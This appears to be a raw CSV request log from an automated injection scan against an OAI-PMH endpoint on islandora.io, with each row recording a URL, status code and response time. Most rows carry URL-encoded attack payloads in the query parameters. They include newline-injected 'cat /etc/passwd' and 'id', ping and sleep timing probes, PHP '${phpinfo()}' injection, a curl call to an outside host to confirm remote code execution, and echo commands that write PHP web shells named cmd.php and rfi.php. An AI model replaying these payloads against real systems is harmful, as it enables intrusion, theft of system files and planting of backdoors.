uuid,timestamp,http_status_code,request_url,response_time,http_version
0a95f8d8-0f91-46d2-b0f6-92416a1852ce,2025-01-28 13:35:34,200,http://islandora.io/oai/request?verb=ListMetadataFormats,53.32 ms,HTTP/1.1
f5044c74-3389-4f8e-b425-2b8447421d63,2025-01-28 13:35:34,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%250A%2Fusr%2Fbin%2Fid%250A,59.76 ms,HTTP/1.1
912a8018-a7de-4681-a823-6b25bf1c1fe2,2025-01-28 13:35:35,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%250A%2Fusr%2Fbin%2Fid%250A&set=%250A%2Fusr%2Fbin%2Fid%250A,54.64 ms,HTTP/1.1
4d3d1ce6-f969-49f1-838e-52c277ae290d,2025-01-28 13:35:35,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%250A%2Fusr%2Fbin%2Fid%250A,50.49 ms,HTTP/1.1
7851d197-2fab-4b59-ae63-59f6ea4aebaf,2025-01-28 13:35:35,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250A%2Fusr%2Fbin%2Fid%250A&metadataPrefix=marc,54.14 ms,HTTP/1.1
5edd0121-cc97-4a4d-b0b5-e5959572330d,2025-01-28 13:35:36,200,http://islandora.io/oai/request?verb=%250Acat%2520%2Fetc%2Fpasswd,61.71 ms,HTTP/1.1
144fedc3-6766-442d-8e66-2bd2d3ddc32d,2025-01-28 13:35:36,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%250Acat%2520%2Fetc%2Fpasswd,72.39 ms,HTTP/1.1
6c5b0c2e-6c22-429c-9973-7a4083025617,2025-01-28 13:35:36,200,http://islandora.io/oai/request?verb=ListSets,46.01 ms,HTTP/1.1
464bba81-9f58-4bd9-9987-cfe7f742399d,2025-01-28 13:35:37,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%250Acat%2520%2Fetc%2Fpasswd&set=%250Acat%2520%2Fetc%2Fpasswd,70.96 ms,HTTP/1.1
03f49477-fcc2-4fb7-b74a-5471fb3de7f1,2025-01-28 13:35:37,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%250Acat%2520%2Fetc%2Fpasswd&until=%250Acat%2520%2Fetc%2Fpasswd,72.04 ms,HTTP/1.1
8870fe6b-7ffc-443f-bfde-edf7e9e0b4ca,2025-01-28 13:35:38,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250Acat%2520%2Fetc%2Fpasswd&metadataPrefix=oai_dc,72.92 ms,HTTP/1.1
748fd08e-ba83-4a4d-93da-cf721e610768,2025-01-28 13:35:38,200,http://islandora.io/oai/request?verb=%250Aid,48.84 ms,HTTP/1.1
da681aa9-1136-4c5f-bb32-8acdb979e8bd,2025-01-28 13:35:39,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%250Aid,63.91 ms,HTTP/1.1
bc29659b-4cba-4f6e-a84b-8bcea2d477a9,2025-01-28 13:35:39,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%250Aid,48.00 ms,HTTP/1.1
6fdcff25-a7f0-4460-b980-908b06067348,2025-01-28 13:35:40,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%250Aid&set=%250Aid,50.52 ms,HTTP/1.1
dc676fdf-52bd-487e-9811-38861f3dbad6,2025-01-28 13:35:40,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc,52.86 ms,HTTP/1.1
f143b1a4-c024-4e34-996f-001c326a3911,2025-01-28 13:35:40,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250Aid&metadataPrefix=marc,75.16 ms,HTTP/1.1
318ded51-c713-414b-b604-702c423ef9a7,2025-01-28 13:35:41,200,http://islandora.io/oai/request?verb=%250Aid%250A,58.15 ms,HTTP/1.1
25eab37d-01e3-493c-8564-8a8495e1c78d,2025-01-28 13:35:41,200,http://islandora.io/oai/request?verb=ListMetadataFormats,34.01 ms,HTTP/1.1
cce07ca3-1604-48a4-8c81-00095643e846,2025-01-28 13:35:41,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%250Aid%250A,48.27 ms,HTTP/1.1
17d08e84-d1e5-458b-b1ae-8500f58c2315,2025-01-28 13:35:42,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%250Aid%250A&until=%250Aid%250A,39.81 ms,HTTP/1.1
b588b646-f9af-4607-9468-b9dc1ce33024,2025-01-28 13:35:42,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc,66.27 ms,HTTP/1.1
9323a189-5a01-49ed-ae9b-aac72f911389,2025-01-28 13:35:43,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250Aid%250A&metadataPrefix=oai_dc,53.00 ms,HTTP/1.1
771c0d5b-3253-4865-9240-5bf3744f6252,2025-01-28 13:35:43,200,http://islandora.io/oai/request?verb=%250a,64.79 ms,HTTP/1.1
5f06f49b-2a24-4a7e-ba3d-3d7af4f92a41,2025-01-28 13:35:44,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%250a,68.20 ms,HTTP/1.1
ed8a7cf1-30bf-4602-84d8-acb63151f1db,2025-01-28 13:35:45,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%250a,49.23 ms,HTTP/1.1
b004c923-1589-4d5c-9a20-4ea15a4a3716,2025-01-28 13:35:45,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%250a&set=%250a,75.76 ms,HTTP/1.1
792deeb1-1e24-4649-9e45-eac575cd70a7,2025-01-28 13:35:46,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&set=%250a,49.11 ms,HTTP/1.1
a46596e7-27c0-4d49-a938-ed53048c03af,2025-01-28 13:35:46,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250a&metadataPrefix=marc,35.83 ms,HTTP/1.1
1da6f6bc-3f0e-410d-87c0-5ceb61c6c661,2025-01-28 13:35:47,200,http://islandora.io/oai/request?verb=%250a+id+%250a,55.99 ms,HTTP/1.1
6ba7c13e-4ebf-4442-b3ce-ea5944286983,2025-01-28 13:35:47,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%250a+id+%250a,58.27 ms,HTTP/1.1
010c2926-4bdd-4f72-be59-9e61cad33033,2025-01-28 13:35:47,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%250a+id+%250a,37.58 ms,HTTP/1.1
6e93cb69-2e0d-4927-ac0a-bc976204f4d3,2025-01-28 13:35:48,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%250a+id+%250a,39.03 ms,HTTP/1.1
3731bd58-316d-43da-b7b3-714b36f4facc,2025-01-28 13:35:48,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%250a+id+%250a&set=%250a+id+%250a,55.53 ms,HTTP/1.1
799b057f-0bcc-434a-8d08-151527d6cd21,2025-01-28 13:35:49,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250a+id+%250a&metadataPrefix=marc,62.61 ms,HTTP/1.1
21008ecd-4b7e-4836-a015-fc5b69305f28,2025-01-28 13:35:49,200,http://islandora.io/oai/request?verb=%250a+ping+-i+30+127.0.0.1+%250a,64.00 ms,HTTP/1.1
d4201c17-81c6-4204-b60a-69dacb7a2f53,2025-01-28 13:35:49,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%250a+ping+-i+30+127.0.0.1+%250a,47.13 ms,HTTP/1.1
59f1c126-78ee-4570-ad4e-58bfb9f0adcf,2025-01-28 13:35:50,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%250a+ping+-i+30+127.0.0.1+%250a,53.58 ms,HTTP/1.1
4f2a9729-0bdc-4175-bad0-1fb16cb97aa9,2025-01-28 13:35:50,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%250a+ping+-i+30+127.0.0.1+%250a&set=%250a+ping+-i+30+127.0.0.1+%250a,38.99 ms,HTTP/1.1
3771bd2e-11b1-4beb-8167-b4a94e0ddbf1,2025-01-28 13:35:51,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc,126.46 ms,HTTP/1.1
81131ae0-565f-4057-b225-e878b5188175,2025-01-28 13:35:51,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250a+ping+-i+30+127.0.0.1+%250a&metadataPrefix=marc,59.86 ms,HTTP/1.1
c7c1fb62-91a6-44cc-81ca-de1e7ffb023a,2025-01-28 13:35:51,200,http://islandora.io/oai/request?verb=%250a%250d,36.55 ms,HTTP/1.1
a239e618-056c-4ac2-a43e-a35bf0dc46df,2025-01-28 13:35:52,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%250a%250d,40.19 ms,HTTP/1.1
395326e1-6b8a-46a8-8e5c-472f0c8dc3f5,2025-01-28 13:35:52,200,http://islandora.io/oai/request?verb=ListSets,36.14 ms,HTTP/1.1
f0970719-c371-45ed-afa2-52bdf27b164a,2025-01-28 13:35:53,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc,56.79 ms,HTTP/1.1
0d988600-a299-499f-84bc-ac1195812940,2025-01-28 13:35:53,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%250a%250d,118.42 ms,HTTP/1.1
ae9cbc21-2399-4244-b18a-a6d47c5b7ef5,2025-01-28 13:35:53,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250a%250d&metadataPrefix=oai_dc,61.21 ms,HTTP/1.1
51583e22-c570-47a1-9bbf-307204549e8b,2025-01-28 13:35:54,200,http://islandora.io/oai/request?verb=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1,64.56 ms,HTTP/1.1
a317d6aa-8751-4828-aded-4815309a16dd,2025-01-28 13:35:54,200,http://islandora.io/oai/request?verb=ListMetadataFormats,45.82 ms,HTTP/1.1
cf17a5e5-c09c-4aa1-b2f9-f7b1695bf7c9,2025-01-28 13:35:54,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1,49.14 ms,HTTP/1.1
75bd8fc3-ec85-41ed-b90e-ae6265ec6ac0,2025-01-28 13:35:55,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1&set=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1,41.76 ms,HTTP/1.1
e7b4e399-1fcf-4928-b81a-068372c0c0bc,2025-01-28 13:35:55,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1&set=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1,57.18 ms,HTTP/1.1
3794ff94-6002-4a09-8553-f7fcf7ac5b7b,2025-01-28 13:35:56,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%252+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%27+%7Cping+-n+21+127.0.0.1%7C%7C%60ping+-c+21+127.0.0.1%60+%23%5C%22+%7Cping+-n+21+127.0.0.1&metadataPrefix=oai_dc,33.82 ms,HTTP/1.1
b215a881-8187-41f7-829e-2b15f0e163aa,2025-01-28 13:35:56,200,http://islandora.io/oai/request?verb=%2520%7B%24%7Bphpinfo%28%29%7D%7D,61.12 ms,HTTP/1.1
6652ef4e-3215-47d3-a9cb-15f4ac813463,2025-01-28 13:35:56,200,http://islandora.io/oai/request?verb=ListMetadataFormats,32.05 ms,HTTP/1.1
fd795810-e71d-42b1-8c77-e69ceee22dfc,2025-01-28 13:35:57,200,http://islandora.io/oai/request?verb=ListSets,45.24 ms,HTTP/1.1
309edc1c-6a76-463a-ab49-b5a454e7af76,2025-01-28 13:35:57,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%2520%7B%24%7Bphpinfo%28%29%7D%7D&set=%2520%7B%24%7Bphpinfo%28%29%7D%7D,77.66 ms,HTTP/1.1
fb1aac03-5471-4222-acb9-f1168a0aed2a,2025-01-28 13:35:57,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%2520%7B%24%7Bphpinfo%28%29%7D%7D&set=%2520%7B%24%7Bphpinfo%28%29%7D%7D,53.86 ms,HTTP/1.1
78d0cccb-5e81-4a68-956b-c73124ace4d0,2025-01-28 13:35:58,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%2520%7B%24%7Bphpinfo%28%29%7D%7D&metadataPrefix=oai_dc,57.35 ms,HTTP/1.1
4ee6885a-d77b-4bcc-8924-055e203bd08a,2025-01-28 13:35:58,200,http://islandora.io/oai/request?verb=%2520%7B%24%7Bsleep%2820%29%7D%7D,60.76 ms,HTTP/1.1
6a4ad8e1-dd56-4dc2-95ef-8bd65ecf8bd3,2025-01-28 13:35:59,200,http://islandora.io/oai/request?verb=ListMetadataFormats,52.95 ms,HTTP/1.1
5dc53754-d2c6-4ab7-bd48-aee82835a537,2025-01-28 13:35:59,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%2520%7B%24%7Bsleep%2820%29%7D%7D,85.49 ms,HTTP/1.1
37f88c1a-ec64-406f-9b7b-488d623f1485,2025-01-28 13:36:00,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%2520%7B%24%7Bsleep%2820%29%7D%7D&set=%2520%7B%24%7Bsleep%2820%29%7D%7D,36.64 ms,HTTP/1.1
99912bd9-828d-42c4-aa15-bd402d428aca,2025-01-28 13:36:00,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%2520%7B%24%7Bsleep%2820%29%7D%7D,143.59 ms,HTTP/1.1
8d2573db-bbdb-4d91-8d92-d0bfa3934e00,2025-01-28 13:36:00,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%2520%7B%24%7Bsleep%2820%29%7D%7D&metadataPrefix=oai_dc,49.32 ms,HTTP/1.1
43250b96-0a18-43ac-9e52-862a326197e7,2025-01-28 13:36:01,200,http://islandora.io/oai/request?verb=%2520%7B%24%7Bsleep%283%29%7D%7D,50.59 ms,HTTP/1.1
fe742481-d967-4236-a577-4c85c46094b3,2025-01-28 13:36:01,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%2520%7B%24%7Bsleep%283%29%7D%7D,61.04 ms,HTTP/1.1
6d831474-39b9-4ff1-a0d4-521dc28781b0,2025-01-28 13:36:02,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%2520%7B%24%7Bsleep%283%29%7D%7D,65.14 ms,HTTP/1.1
842c4e17-f3b4-49a0-9315-c8f20ecdde34,2025-01-28 13:36:02,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,62.42 ms,HTTP/1.1
fb8456d2-1acb-4d4f-b94d-72cca1ec5abf,2025-01-28 13:36:02,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%2520%7B%24%7Bsleep%283%29%7D%7D&until=%2520%7B%24%7Bsleep%283%29%7D%7D&set=%2520%7B%24%7Bsleep%283%29%7D%7D,51.75 ms,HTTP/1.1
d01db4bc-01e8-4496-8c12-91e2e404f0a6,2025-01-28 13:36:03,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%2520%7B%24%7Bsleep%283%29%7D%7D&metadataPrefix=marc,43.79 ms,HTTP/1.1
14450235-0829-4276-b8e5-25e5b0479602,2025-01-28 13:36:03,200,http://islandora.io/oai/request?verb=%26,35.00 ms,HTTP/1.1
1e1f3e33-a66c-4ccd-8e95-7c9a09242779,2025-01-28 13:36:03,200,http://islandora.io/oai/request?verb=ListMetadataFormats,53.13 ms,HTTP/1.1
8e75cf8d-1010-4f44-bfc3-844b4e1367dc,2025-01-28 13:36:04,200,http://islandora.io/oai/request?verb=ListSets,44.22 ms,HTTP/1.1
d5add6c1-ca4f-44aa-88d2-e648c730689c,2025-01-28 13:36:04,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc,32.92 ms,HTTP/1.1
d3830ede-93e4-40da-ba6e-63ef1fd0fc3f,2025-01-28 13:36:05,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%26&set=%26,61.34 ms,HTTP/1.1
6312e0cc-8888-4588-991d-3c6025bdde0e,2025-01-28 13:36:05,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26&metadataPrefix=oai_dc,56.42 ms,HTTP/1.1
862e3230-ce3b-4970-9f37-42b9b306f847,2025-01-28 13:36:05,200,http://islandora.io/oai/request?verb=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt,57.39 ms,HTTP/1.1
b41a8150-9541-4aab-9b29-576eebc86930,2025-01-28 13:36:06,200,http://islandora.io/oai/request?verb=ListMetadataFormats,48.38 ms,HTTP/1.1
51591ebf-e087-4cf1-985a-6680c8a12ec0,2025-01-28 13:36:06,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt,54.82 ms,HTTP/1.1
5c40aaf7-9af0-422e-9823-1c4a6e2d5918,2025-01-28 13:36:06,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt,53.68 ms,HTTP/1.1
2934d8df-ec35-4572-851d-55a7be9a1ba7,2025-01-28 13:36:07,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt&set=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt,63.71 ms,HTTP/1.1
e4063e91-372c-4bf7-bbbb-edd984a5a128,2025-01-28 13:36:07,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26+curl+http%3A%2F%2Fcrowdshield.com%2F.testing%2Frce.txt&metadataPrefix=oai_dc,43.29 ms,HTTP/1.1
d1e945da-9a61-4f80-b8dc-8f95935d8c57,2025-01-28 13:36:08,200,http://islandora.io/oai/request?verb=%26+dir,48.67 ms,HTTP/1.1
b5f3c072-daa9-4d87-b937-ed11629625b9,2025-01-28 13:36:08,200,http://islandora.io/oai/request?verb=ListMetadataFormats,37.82 ms,HTTP/1.1
2474e0c2-bda9-4aa8-b71c-c850c1e46dce,2025-01-28 13:36:08,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26+dir,63.54 ms,HTTP/1.1
51608a67-f8ab-4e3d-8c8a-8e4db0565f13,2025-01-28 13:36:09,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%26+dir&until=%26+dir,34.67 ms,HTTP/1.1
ead01dc0-ecb8-4a95-9ab8-d200b6718cc0,2025-01-28 13:36:09,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%26+dir&until=%26+dir,41.22 ms,HTTP/1.1
0b2124a7-113f-43b9-987d-eb625df7de7f,2025-01-28 13:36:10,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26+dir&metadataPrefix=marc,56.98 ms,HTTP/1.1
8780d9bb-a5ce-4fb2-b3bf-fc9d25d1ccf3,2025-01-28 13:36:10,200,http://islandora.io/oai/request?verb=%26+dir+C%3A%5C,60.95 ms,HTTP/1.1
91b3315f-1fa2-4f69-ace0-55c5d50e9c14,2025-01-28 13:36:10,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26+dir+C%3A%5C,57.84 ms,HTTP/1.1
9e72a9c1-7c78-4136-bad6-bc16ab78d436,2025-01-28 13:36:11,200,http://islandora.io/oai/request?verb=ListSets,36.40 ms,HTTP/1.1
e26ca1b3-fd81-4c4f-8f58-910ecd07fd72,2025-01-28 13:36:11,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%26+dir+C%3A%5C&set=%26+dir+C%3A%5C,45.95 ms,HTTP/1.1
51d704b0-9500-4e90-8cda-013f9911cce4,2025-01-28 13:36:12,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%26+dir+C%3A%5C,46.98 ms,HTTP/1.1
7b32369d-99a8-4736-ab7c-c101b27d3e6b,2025-01-28 13:36:12,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26+dir+C%3A%5C&metadataPrefix=marc,51.29 ms,HTTP/1.1
61521b11-0fab-4c0e-99f9-d91e0a3fadbb,2025-01-28 13:36:12,200,http://islandora.io/oai/request?verb=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A,55.30 ms,HTTP/1.1
7bbf68e3-4f56-4ba1-a2ee-5639a52b2920,2025-01-28 13:36:13,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A,70.16 ms,HTTP/1.1
00561c11-ad0b-4f18-a771-98107756aa87,2025-01-28 13:36:13,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A,40.73 ms,HTTP/1.1
54d158f3-98f8-4b36-88f2-3b02691d29eb,2025-01-28 13:36:14,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A&until=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A&set=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A,48.12 ms,HTTP/1.1
639a83eb-0a88-4882-941e-6245e75be7c3,2025-01-28 13:36:14,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A,60.70 ms,HTTP/1.1
61324bcf-2c3a-43de-9d39-830120c15dc6,2025-01-28 13:36:14,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26+dir+C%3A%5CDocuments+and+Settings%5C%2A&metadataPrefix=marc,41.31 ms,HTTP/1.1
7ef4223d-226c-46a7-bd84-803107e535c2,2025-01-28 13:36:15,200,http://islandora.io/oai/request?verb=%26+dir+C%3A%5CUsers,38.05 ms,HTTP/1.1
309eee27-03bd-44b6-a1ae-1aea127b7d48,2025-01-28 13:36:15,200,http://islandora.io/oai/request?verb=ListMetadataFormats,43.98 ms,HTTP/1.1
55a5af68-3c86-43cb-a9f0-c44c042e554d,2025-01-28 13:36:15,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26+dir+C%3A%5CUsers,37.43 ms,HTTP/1.1
b7787efa-13d7-40c9-aad8-3e7500bd2405,2025-01-28 13:36:16,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%26+dir+C%3A%5CUsers,69.08 ms,HTTP/1.1
8ce0f615-5a6d-47d8-bbc4-8b5654465ad8,2025-01-28 13:36:16,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%26+dir+C%3A%5CUsers&set=%26+dir+C%3A%5CUsers,45.48 ms,HTTP/1.1
b077a64d-0efe-4b91-b64c-05502dd50c72,2025-01-28 13:36:17,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26+dir+C%3A%5CUsers&metadataPrefix=marc,47.12 ms,HTTP/1.1
feeecfdc-7c0d-4662-a9fb-307a9e7460ca,2025-01-28 13:36:17,200,http://islandora.io/oai/request?verb=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php,51.61 ms,HTTP/1.1
c0e57774-3737-4a30-9450-d3ae1257afa3,2025-01-28 13:36:17,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php,40.67 ms,HTTP/1.1
99505288-6ca2-4c93-a611-4412c933f575,2025-01-28 13:36:18,200,http://islandora.io/oai/request?verb=ListSets,35.33 ms,HTTP/1.1
95516d65-6e41-49f1-908b-d892fe57fffe,2025-01-28 13:36:18,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php&until=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php,39.15 ms,HTTP/1.1
eb8c6765-d9d1-4b12-b1e0-deebd6ee35d8,2025-01-28 13:36:18,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php&set=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php,35.46 ms,HTTP/1.1
c983c6cf-8ea2-4d06-92e8-62ce3a9a120a,2025-01-28 13:36:19,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%26+echo+%22%3C%3Fphp+include%28%24_GET%5B%27page%27%5D%29%3B+%3F%3E%22+%3E+rfi.php&metadataPrefix=oai_dc,36.61 ms,HTTP/1.1
3065d3f9-d3a0-4604-8e27-9f1836cb5735,2025-01-28 13:36:19,200,http://islandora.io/oai/request?verb=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,67.06 ms,HTTP/1.1
38049173-1bd0-40eb-9820-a6cb2edfe717,2025-01-28 13:36:20,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,43.77 ms,HTTP/1.1
44bbb84a-18ef-44e1-a4c4-be3c733b75f1,2025-01-28 13:36:20,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,60.70 ms,HTTP/1.1
9d69d784-a466-439e-b200-27d17d9dc358,2025-01-28 13:36:20,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php&until=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php&set=%26+echo+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+%3E+cmd.php,35.81 ms,HTTP/1.1
